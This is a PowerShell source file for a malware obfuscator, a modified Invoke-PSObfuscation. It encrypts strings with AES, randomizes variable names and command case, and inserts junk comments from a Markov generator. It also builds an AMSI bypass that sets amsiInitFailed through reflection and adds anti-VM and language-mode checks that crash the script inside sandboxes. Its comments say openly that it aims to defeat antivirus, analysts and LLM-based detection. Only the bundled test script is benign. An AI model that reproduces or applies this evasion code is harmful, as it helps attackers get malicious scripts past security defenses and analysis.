# modified version of https://github.com/gh0x0st/Invoke-PSObfuscation/blob/main/Invoke-PSObfuscation.ps1
# some of these were added by me, i just thought i'd make them verbose like the original ones to continue the theme
gc wordlist.ps1|out-string|iex
# -NoJunk: reduces size for things like the downloader shortcut script
# -NoComment: does not include comments
Function Invoke-PSObfuscation {
	param([string]$Content,[switch]$NoJunk,[switch]$NoComment)
	if (!$NoJunk){$Content = Find-Variable -Payload $Content} else {$Content = Find-Variable -Payload $Content -NoLongNames}
	$Content = Find-String -Payload $Content
	if ((!$NoJunk)-and(!$NoComment)){$Content = Add-FakeComments -Payload $Content}
	return $Content
}

Function New-EncodedBeacon {
	param($Value)
	if ($Value) {
		return "<obfus$($Value-replace'','%')cate>"
	}
	else {
		return "<obfus$([int](Get-Date -u %s))cate>"
	}
}
function Get-OperatorEncapsulation {
	param($Value)
	$maxIterations = Get-Random (1..3)
	for ($i = 0; $i -lt $maxIterations; $i++) {
		$Value=Get-Random ("`$($Value)","($Value)")
	}
	return $Value;
}
function startmarkov {$st = [Diagnostics.ProcessStartInfo]::new();$st.FileName = "python";$st.Arguments = "$pwd\markov_py\markov.py";$st.RedirectStandardInput = $true;$st.RedirectStandardOutput = $true;$st.UseShellExecute = $false;$st.CreateNoWindow = $true;$global:p = [Diagnostics.Process]::Start($st)}
function killmarkov {$p.StandardInput.WriteLine("exit");$p.StandardOutput.ReadLine()}


if ($use_older_comment_gen_system) {
	function commentgen {
	    $words=Get-Random $wordlist -c (Get-Random (10..50))
	    foreach($word in $words) {
	        $comment+=$word
	        $comment+=(Get-Random (' ',(Get-Random ('. ',', ','? ','! '))))
	    }
	    return $comment.trimend(' ')
	}
} else {
	function commentgen {$global:p.StandardInput.WriteLine("gen");($p.StandardOutput.ReadLine())-replace'[''"#\{\}]'-replace'  ',' '}
}

# the updated version uses a "high tech" markov chain to generate the fake comments
# the old version just selects random words from a large list and adds punctuation
function Add-FakeComments {
	param([string]$Payload)
	if (!$use_older_comment_gen_system) {$null=startmarkov}
	$NewText = [Collections.Generic.List[string]]::new()
	if ($Payload.contains("`n")) {
		$script = $Payload-split"`n"
		foreach ($i in $script) {
			$temp=''
			$num = Get-Random (0..3)
			for ($j = 0; $j -lt $num; $j++) {
				$temp += "# $(commentgen)`n"
			}
			$NewText.Add($i+"`n"+$temp)
		}
		$NewText = $NewText -join "`n"
	}
	else {
		$script = $Payload-split';'
		foreach ($i in $script) {
			$temp = ''
			$num = Get-Random (0..3)
			for ($j = 0; $j -lt $num; $j++) {
				$temp += "<#$(commentgen)#>"
			}
			$NewText.Add($i + ";" + $temp)
		}
		$NewText=$NewText-join''
	}
	if (!$use_older_comment_gen_system) {$null=killmarkov}
	return $NewText
}
function obf-cmd {
	param([string]$Text)
	-join ($Text.ToCharArray() | % {if(Get-Random (0..1)){$_.ToString().ToUpper()} else{$_.ToString().ToLower()}})
}
function Find-Cmdlet {
	param($Payload)
	$Occurrences = [Management.Automation.PSParser]::Tokenize($Payload,[ref]$null) | where {$_.Type -in ('Command','Member','Type') -and $_.Content -ne 'content' -and $_.Content.length -ne 1} | select -exp Content
	try {
		$Occurrences | % {
			$Beacon = New-EncodedBeacon -Value $_
			$Payload = $Payload-replace[regex]::Escape($_),$Beacon
		}
		(($Payload | sls '<obfus(.*?)cate>' -a)).Matches.Value | % {
			$Decoded = $_ -replace '<obfus' -replace 'cate>' -replace '%'
			$NewValue = obf-cmd $Decoded
			$Payload = $Payload-replace[regex]::Escape($_), $NewValue
		}
	}
	Catch {
		Write-Host "[!] $($MyInvocation.MyCommand.Name) Error - $($_.Exception.Message) - Skipping"
	}
	return $Payload
}
function Find-Variable {
	param($Payload,[switch]$NoLongNames)
	$Variables = [regex]::Matches($Payload, '(?<!\w)\$\w+').Value | where { $_ -notlike '$_*' } | select -u
	$Parameters = [regex]::Matches($Payload, '.PARAMETER\s(\w+)').Value | % { "`$(($_ -split '\s')[1])" }
	$Blacklist = '$env', '$?', '$^', '$args', '$ConfirmPreference', '$ConsoleFileName', '$DebugPreference', '$Error', '$ErrorActionPreference', '$ErrorView', '$ExecutionContext', '$false', '$FormatEnumerationLimit', '$HOME', '$Host', '$InformationPreference', '$input', '$LASTEXITCODE', '$MaximumAliasCount', '$MaximumDriveCount', '$MaximumErrorCount', '$MaximumFunctionCount', '$MaximumHistoryCount', '$MaximumVariableCount', '$MyInvocation', '$NestedPromptLevel', '$null', '$OutputEncoding', '$PID', '$PROFILE', '$ProgressPreference', '$PSBoundParameters', '$PSCommandPath', '$PSCulture', '$PSDefaultParameterValues', '$PSEdition', '$PSEmailServer', '$PSHOME', '$PSScriptRoot', '$PSSessionApplicationName', '$PSSessionConfigurationName', '$PSSessionOption', '$PSUICulture', '$PSVersionTable', '$PWD', '$ShellId', '$StackTrace', '$true', '$VerbosePreference', '$WarningPreference', '$WhatIfPreference', '$Position', '$Ocpffset', '$MarshalAs', '$DllName', '$FunctionName', '$EntryPoint', '$ReturnType', '$ParameterTypes', '$NativeCallingConvention', '$Charset', '$SetLastError', '$Module', '$Namespace'
		$Variables = compare -r $Blacklist -d $Variables | ? { $_.SideIndicator -eq '=>' } | Select -exp InputObject
	Try {
		# notice how each new variable just builds on the last variable
		# this is so when someone analyzes this and they are renaming variables, it will mangle the rest of them
		$Occurrences = compare -r $Parameters -d $Variables -i
		$Occurrences | ? { $_.SideIndicator -eq '==' } | % {
			if ($NoLongNames) {[string]$x+=[char](Get-Random ((48..57)+(65..90)+(97..122)))} else {foreach($ewf in (1..(Get-Random (1..25)))){[string]$x+=[char](Get-Random ((48..57)+(65..90)+(97..122)))}}
			$ToReplace = $($_.InputObject)
			$Payload = $Payload -replace "\$ToReplace\b", "`$$x"
			$ToReplace = $($_.InputObject) -replace '\$', '-'
			$Payload = $Payload -replace "$ToReplace\b", "-$x"
		}
		$Occurrences | ? { $_.SideIndicator -eq '=>' } | % {
			if ($NoLongNames) {$x=''}
			foreach($ewf in (1..(Get-Random (1..25)))){[string]$x+=[char](Get-Random ((48..57)+(65..90)+(97..122)))}
			$ToReplace = $($_.InputObject)
			$Payload = $Payload -replace "\$ToReplace\b", "`$$x"
		}
	}
	Catch {
		Write-Host "[!] $($MyInvocation.MyCommand.Name) Error - $($_.Exception.Message) - Skipping"
	}
	return $Payload
}
function randstring {foreach($ewf in (1..(Get-Random (10..50)))){[string]$string+=[char](Get-Random ((48..57)+(65..90)+(97..122)))};return $string}
function randchar {[string]$string=[char](Get-Random ((48..57)+(65..90)+(97..122)));return $string}
$decryptor_name=randstring
$png_func_name=randstring
$resolver_name=randstring
$rand=randstring
# using AES instead of XOR and/or other obfuscation methods is an anti LLM/AI trick, because for some reason LLMs are very bad at decrypting AES, even ECB, which is horrible
# the reason i care about this is a lot of security products now partially rely on LLMs for detections, and this helps cripple that,
# it also helps make each generated payload more unique
function str-crypter {
	param($x)
	$x=[Text.Encoding]::UTF8.GetBytes($x)
	$AES = [Security.Cryptography.AES]::Create()
	$key=$AES.Key
	$AES.mode=2 # ECB
	$Encryptor = $AES.CreateEncryptor()
	return (Get-OperatorEncapsulation -Value "$decryptor_name `"$([Convert]::ToBase64String(($Encryptor.TransformFinalBlock($x, 0, $x.length))))`" ($($key-join','))")
}
$decryptor_func=Find-Cmdlet ('function '+$decryptor_name+' {param($x,$e);$x=[convert]::frombase64string($x);$aes = [security.cryptography.aes]::create();[byte[]]$key=$e;$aes.mode=2;$aes.key=$key;$decryptor = $aes.createdecryptor();return [text.encoding]::utf8.getstring($decryptor.transformfinalblock($x, 0, $x.length))}')
$trueobf='"{0}"-eq"{0}~~"."trimend"("~")' -f (randstring)
$amsi=';$g=([type]"ref")."assembly"."gettype"("System.Management.Automation.AmsiUtils")."getfield"("amsiInitFailed","NonPublic,Static");$g."setvalue"($'+$rand+','+$trueobf+')'
# for security reasons, a lot of hypervisors wont expose much info in the SMBIOS tables to VMs, 
# so i guess instead of the hypervisor making up garbage info to provide for the WMI classes associated with that info,
# querying those classes will just return null instead of returning literally anything like it would on a real machine
$wmiq=Get-Random ("win32_portconnector","cim_memory","cim_physicalconnector","cim_slot","win32_smbiosmemory","win32_memoryarray","win32_memorydevice","win32_physicalmemory","win32_cachememory","win32_systemslot","win32_physicalmemoryarray","win32_memorydevicearray","cim_cachememory","cim_physicalmemory","win32_memoryarraylocation","win32_memorydevicelocation","cim_associatedmemory","cim_associatedprocessormemory","win32_associatedprocessormemory","cim_chip","cim_packagedcomponent","win32_physicalmemorylocation","cim_container")
$anti_vm="`nif (&""gcim"" ""$wmiq"") {`n`t([type]""Environment"")::""FailFast"".""invoke""(""Error: virtual machine detected"")`n}"
$lang_verify="`nif ((&""gv"" ""executioncontext"").""value"".""sessionstate"".""languagemode"" -ne ""fulllanguage"") {`n`t([type]""Environment"")::""FailFast"".""invoke""(""Error: unsupported language mode"")`n}"

function Find-String {
	param($Payload)
	$Occurrences = (($Payload | sls '(["''])(?:(?=(\\?))\2.)*?\1' -a)).Matches.Value | where { $_ -notmatch '\$env' } | select -u
	Try {
		$Occurrences | % {
			$Beacon = New-EncodedBeacon -Value ($_ -replace '"' -replace "'")
			if ($_-notmatch'\{\d\}'-or$_-match'gpv \{0\}') {$Payload = $Payload-replace [regex]::Escape($_), $Beacon}
		}
		(($Payload | sls '<obfus(.*?)cate>' -a)).Matches.Value | % {
			$Decoded = $_ -replace '<obfus' -replace 'cate>' -replace '%'
			$NewValue = str-crypter $Decoded
			$Payload = $Payload -replace [regex]::Escape($_),$NewValue
		}
	}
	Catch {
		Write-Host "[!] $($MyInvocation.MyCommand.Name) Error - $($_.Exception.Message) - Skipping"
	}
	return $Payload
}

# an obfuscation test script that i generated with ai (i will admit, creating test scripts is one very useful application for ai)
# (i dont remember the exact prompt, but it was something like "create a simple winforms ui in powershell")
$test_script=@'
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
$form = New-Object Windows.Forms.Form
$form.Text = "PowerShell WinForms Demo"
$form.Size = New-Object Drawing.Size(400,200)
$form.StartPosition = "CenterScreen"
$label = New-Object Windows.Forms.Label
$label.Location = New-Object Drawing.Point(20,20)
$label.Size = New-Object Drawing.Size(100,20)
$label.Text = "Enter your name:"
$form.Controls.Add($label)
$textBox = New-Object Windows.Forms.TextBox
$textBox.Location = New-Object Drawing.Point(20,50)
$textBox.Size = New-Object Drawing.Size(250,20)
$form.Controls.Add($textBox)
$button = New-Object Windows.Forms.Button
$button.Location = New-Object Drawing.Point(20,90)
$button.Size = New-Object Drawing.Size(100,30)
$button.Text = "Submit"
$button.Add_Click({[Windows.Forms.MessageBox]::Show("Hello, $($textBox.Text)!","Greeting","OK","Information")})
$form.Controls.Add($button)
[void]$form.ShowDialog()
'@

# this is a modified version used for testing the obfuscator
$obfuscation_test_script=$decryptor_func + @'

&"Add-Type" -a "System.Windows.Forms", "System.Drawing"
$form = &"New-Object" "Windows.Forms.Form"
$form."Text" = "PowerShell WinForms Demo"
$form."Size" = &"New-Object" "Drawing.Size"(400,200)
$form."StartPosition" = "CenterScreen"
$label = &"New-Object" "Windows.Forms.Label"
$label."Location" = &"New-Object" "Drawing.Point"(20,20)
$label."Size" = &"New-Object" "Drawing.Size"(100,20)
$label."Text" = "Enter your name:"
$form."Controls"."Add"($label)
$textBox = &"New-Object" "Windows.Forms.TextBox"
$textBox."Location" = &"New-Object" "Drawing.Point"(20,50)
$textBox."Size" = &"New-Object" "Drawing.Size"(250,20)
$form."Controls"."Add"($textBox)
$button = &"New-Object" "Windows.Forms.Button"
$button."Location" = &"New-Object" "Drawing.Point"(20,90)
$button."Size" = &"New-Object" "Drawing.Size"(100,30)
$button."Text" = "Submit"
$button."Add_Click"({(([type]"Windows.Forms.MessageBox")::"Show")."invoke"(("Hello, $($textBox."Text")!","Greeting","OK","Information"))})
$form."Controls"."Add"($button)
$null = $form."ShowDialog"()
'@